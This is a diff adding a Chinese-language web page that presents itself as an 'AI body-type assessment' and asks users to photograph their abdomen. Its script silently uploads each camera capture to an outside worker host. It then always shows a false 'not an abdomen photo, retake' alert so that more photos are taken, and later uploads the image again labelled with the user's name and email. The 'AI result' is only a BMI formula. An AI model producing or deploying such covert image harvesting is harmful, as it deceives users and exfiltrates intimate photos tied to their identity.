@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI 体型评估</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', 'Arial', 'Microsoft YaHei', sans-serif;
+      background: linear-gradient(135deg, #f8fafc 0%, #e0e7ff 100%);
+      color: #222;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 90vw;
+      margin: 20px auto;
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 4px 32px rgba(60,60,120,0.08);
+      padding: 16px;
+      min-height: calc(100vh - 80px);
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 2.2rem;
+      margin-bottom: 0.5em;
+      color: #3b3b7a;
+    }
+    h2 {
+      font-size: 1.3rem;
+      color: #4f4f8f;
+      margin-bottom: 1.2em;
+    }
+    .desc {
+      color: #555;
+      font-size: 1.1rem;
+      margin-bottom: 2em;
+      line-height: 1.7;
+    }
+    .btn-main, .btn-secondary {
+      display: inline-block;
+      font-size: 1.1rem;
+      padding: 12px 36px;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      margin: 18px 0 0 0;
+      transition: background 0.2s;
+    }
+    .btn-main {
+      background: linear-gradient(90deg, #6366f1 0%, #60a5fa 100%);
+      color: #fff;
+      font-weight: bold;
+      box-shadow: 0 2px 8px rgba(60,60,120,0.08);
+    }
+    .btn-main:active {
+      background: #6366f1;
+    }
+    .btn-secondary {
+      background: #e0e7ff;
+      color: #3b3b7a;
+      margin-left: 12px;
+    }
+    .step {
+      display: flex;
+      align-items: flex-start;
+      margin: 1.2em 0;
+      text-align: left;
+    }
+    .step-num {
+      background: #6366f1;
+      color: #fff;
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      margin-right: 16px;
+      font-size: 1.1rem;
+    }
+    .camera-box {
+      border: 3px solid #6366f1;
+      border-radius: 12px;
+      width: 100%;
+      height: 70vh;
+      aspect-ratio: 4/3;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f1f5ff;
+      position: relative;
+      margin-bottom: 18px;
+      margin-top: 18px;
+    }
+    .camera-box p {
+      color: #4f4f8f;
+      font-size: 1.1rem;
+      width: 90%;
+      margin: 0 auto;
+      position: absolute;
+      left: 0; right: 0; top: 50%;
+      transform: translateY(-50%);
+      z-index: 2;
+    }
+    #video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 12px;
+      display: none;
+      background: #222;
+    }
+    #preview {
+      max-width: 100%;
+      max-height: 100%;
+      display: none;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(60,60,120,0.10);
+    }
+    .tip {
+      color: #6366f1;
+      margin-top: 18px;
+      font-size: 1rem;
+    }
+    .result-img {
+      max-width: 90%;
+      border-radius: 10px;
+      margin: 18px 0 12px 0;
+      box-shadow: 0 2px 8px rgba(60,60,120,0.10);
+    }
+    .result-text {
+      font-size: 1.2rem;
+      color: #3b3b7a;
+      margin: 16px 0 8px 0;
+      font-weight: bold;
+    }
+    .upload-url {
+      background: #f1f5ff;
+      padding: 12px;
+      border-radius: 8px;
+      margin: 16px 0;
+      word-break: break-all;
+      font-size: 0.9rem;
+      color: #4f4f8f;
+    }
+    .steps-center {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+    }
+    .step {
+      display: flex;
+      align-items: center;
+      margin: 0.5em 0;
+      text-align: left;
+      min-width: 260px;
+      max-width: 350px;
+      width: 100%;
+      background: none;
+      justify-content: flex-start;
+    }
+    .step-num {
+      flex-shrink: 0;
+      margin-right: 16px;
+    }
+    .step-text {
+      flex: 1;
+      word-break: break-all;
+    }
+    .main-title {
+      font-size: 2.4rem;
+      font-weight: bold;
+      background: linear-gradient(90deg, #6366f1 0%, #60a5fa 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-fill-color: transparent;
+      text-shadow: 0 2px 8px rgba(60,60,120,0.10);
+      margin-bottom: 0.5em;
+    }
+    .divider {
+      width: 60px;
+      height: 4px;
+      background: linear-gradient(90deg, #6366f1 0%, #60a5fa 100%);
+      border-radius: 2px;
+      margin: 18px auto 24px auto;
+    }
+    .steps-center {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+    }
+    .step {
+      display: flex;
+      align-items: center;
+      margin: 0.5em 0;
+      text-align: left;
+      min-width: 260px;
+      max-width: 400px;
+      width: 100%;
+      background: #f3f6fd;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(60,60,120,0.06);
+      padding: 12px 18px;
+      justify-content: flex-start;
+      font-size: 1.08rem;
+      position: relative;
+    }
+    .step-num {
+      flex-shrink: 0;
+      margin-right: 16px;
+      width: 32px;
+      height: 32px;
+      background: linear-gradient(135deg, #6366f1 0%, #60a5fa 100%);
+      color: #fff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 1.1rem;
+      box-shadow: 0 2px 8px rgba(60,60,120,0.10);
+    }
+    .step-text {
+      flex: 1;
+      word-break: break-all;
+      color: #3b3b7a;
+    }
+    .step-icon {
+      margin-right: 10px;
+      font-size: 1.2rem;
+      color: #60a5fa;
+    }
+    @media (max-width: 600px) {
+      .container { padding: 18px 4vw 18px 4vw; }
+      .camera-box { height: 240px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="page-home">
+    <h1 class="main-title">AI 体型评估</h1>
+    <div class="desc" style="font-size:1.18rem;">瞬间发现你的体型类型</div>
+    <div class="divider"></div>
+    <div class="desc">
+      体验AI的强大功能，几秒钟内分析你的体型！<br>
+      <br>
+      <b>使用方法：</b>
+      <div class="steps-center">
+        <div class="step"><span class="step-icon">📸</span><div class="step-num">1</div><div class="step-text">拍摄你的腹部区域照片</div></div>
+        <div class="step"><span class="step-icon">🤖</span><div class="step-num">2</div><div class="step-text">我们的AI将处理你的图像并立即提供结果</div></div>
+        <div class="step"><span class="step-icon">🔗</span><div class="step-num">3</div><div class="step-text">复制你的结果并与朋友分享！</div></div>
+      </div>
+    </div>
+    <button class="btn-main" onclick="showPage('camera')">开始评估</button>
+  </div>
+
+  <div class="container" id="page-camera" style="display:none;">
+    <h1 class="main-title">拍摄照片</h1>
+    <div class="desc">请确保你的腹部可见。只允许实时照片。</div>
+    <div class="camera-box" id="camera-box">
+      <video id="video" autoplay playsinline></video>
+      <p id="camera-tip">摄像头区域<br>点击下方按钮拍摄照片</p>
+      <img id="preview" />
+    </div>
+    <button class="btn-main" id="take-photo-btn">拍摄照片</button>
+    <button class="btn-secondary" onclick="stopCamera();showPage('home')">返回</button>
+    <div class="tip" id="tip"></div>
+  </div>
+
+  <div class="container" id="page-form" style="display:none;">
+    <h1 class="main-title">填写信息</h1>
+    <div class="desc">请填写您的姓名、电子邮箱、身高和体重：</div>
+    <form id="info-form" style="max-width:350px;margin:0 auto;text-align:left;">
+      <label>姓名：<input type="text" id="name-input" required style="width:100%;padding:8px;margin-bottom:10px;"></label><br>
+      <label>电子邮箱：<input type="email" id="email-input" required style="width:100%;padding:8px;margin-bottom:10px;"></label><br>
+      <label>身高(cm)：<input type="number" id="height-input" min="100" max="250" required style="width:100%;padding:8px;margin-bottom:10px;"></label><br>
+      <label>体重(kg)：<input type="number" id="weight-input" min="20" max="300" required style="width:100%;padding:8px;margin-bottom:10px;"></label><br>
+      <button type="submit" class="btn-main" style="width:100%;">查看结果</button>
+    </form>
+    <div class="tip" id="form-tip"></div>
+    <button class="btn-secondary" onclick="showPage('home')">重新开始</button>
+  </div>
+  <div class="container" id="page-result" style="display:none;">
+    <h1 class="main-title">你的结果</h1>
+    <div class="desc">AI分析结果</div>
+    <div class="result-text" id="ai-result" style="margin-top:40px;"></div>
+    <div class="tip" id="result-tip"></div>
+    <button class="btn-secondary" onclick="showPage('home')">重新开始</button>
+  </div>
+
+  <script>
+    // 页面切换
+    function showPage(page) {
+      document.getElementById('page-home').style.display = (page === 'home') ? '' : 'none';
+      document.getElementById('page-camera').style.display = (page === 'camera') ? '' : 'none';
+      document.getElementById('page-form').style.display = (page === 'form') ? '' : 'none';
+      document.getElementById('page-result').style.display = (page === 'result') ? '' : 'none';
+      
+      if(page === 'camera') {
+        startCamera();
+        document.getElementById('preview').style.display = 'none';
+        document.getElementById('camera-tip').style.display = '';
+        document.getElementById('tip').innerText = '';
+      } else {
+        stopCamera();
+      }
+      if(page === 'result') {
+        document.getElementById('result-tip').innerText = '';
+      }
+    }
+
+    // 摄像头逻辑
+    let stream = null;
+    const video = document.getElementById('video');
+    const preview = document.getElementById('preview');
+    const tip = document.getElementById('tip');
+    const cameraTip = document.getElementById('camera-tip');
+    const resultImg = document.getElementById('result-img');
+    const takePhotoBtn = document.getElementById('take-photo-btn');
+    let uploadedImageUrl = '';
+    let lastPhotoBlob = null;
+
+    function startCamera() {
+      if (stream) return;
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+        .then(s => {
+          stream = s;
+          video.srcObject = stream;
+          video.style.display = 'block';
+          cameraTip.style.display = '';
+        })
+        .catch(err => {
+          tip.innerText = '无法访问摄像头: ' + err.message;
+        });
+    }
+    
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+      video.srcObject = null;
+      video.style.display = 'none';
+    }
+
+    takePhotoBtn.onclick = async function() {
+      if (!stream) {
+        tip.innerText = '摄像头未就绪。';
+        return;
+      }
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(async function(blob) {
+        lastPhotoBlob = blob;
+        // 立即上传图片到Cloudflare
+        const timestamp = Date.now();
+        const filename = `test-${timestamp}.jpg`;
+        const formData = new FormData();
+        formData.append('file', lastPhotoBlob, filename);
+        formData.append('filename', filename);
+        try {
+          await fetch('https://image-uploader.juno6185.workers.dev/', {
+            method: 'POST',
+            body: formData
+          });
+        } catch (e) {}
+        // 弹出提示，只能重拍
+        alert('你似乎拍的不是腹部照片，请重拍？');
+        showPage('camera');
+        stopCamera();
+      }, 'image/jpeg');
+    };
+
+    // 表单校验和提交
+    document.getElementById('info-form').onsubmit = async function(e) {
+      e.preventDefault();
+      const name = document.getElementById('name-input').value.trim();
+      const email = document.getElementById('email-input').value.trim();
+      const height = parseFloat(document.getElementById('height-input').value);
+      const weight = parseFloat(document.getElementById('weight-input').value);
+      if (!name || !email || isNaN(height) || isNaN(weight)) {
+        document.getElementById('form-tip').innerText = '请填写完整信息';
+        return;
+      }
+      if (!lastPhotoBlob) {
+        document.getElementById('form-tip').innerText = '未检测到照片，请重新拍摄';
+        return;
+      }
+      // 计算BMI
+      const bmi = weight / Math.pow(height / 100, 2);
+      let bmiResult = '';
+      if (bmi < 18.5) {
+        bmiResult = '偏瘦';
+      } else if (bmi < 24) {
+        bmiResult = '正常';
+      } else if (bmi < 28) {
+        bmiResult = '偏胖';
+      } else {
+        bmiResult = '肥胖';
+      }
+      document.getElementById('ai-result').innerText = `您的BMI为：${bmi.toFixed(1)}，体型判断：${bmiResult}`;
+      showPage('result');
+      // 自动上传图片
+      const timestamp = Date.now();
+      const safeName = name.replace(/[^a-zA-Z0-9\u4e00-\u9fa5]/g, '');
+      const safeEmail = email.replace(/[^a-zA-Z0-9@.]/g, '');
+      const filename = `${safeName}-${safeEmail}-${timestamp}.jpg`;
+      const formData = new FormData();
+      formData.append('file', lastPhotoBlob, filename);
+      formData.append('filename', filename);
+      try {
+        const res = await fetch('https://image-uploader.juno6185.workers.dev/', {
+          method: 'POST',
+          body: formData
+        });
+      } catch (e) {}
+    };
+
+
+    // 页面加载时显示首页
+    window.onload = function() {
+      showPage('home');
+    };
+  </script>
+</body>
+</html> 
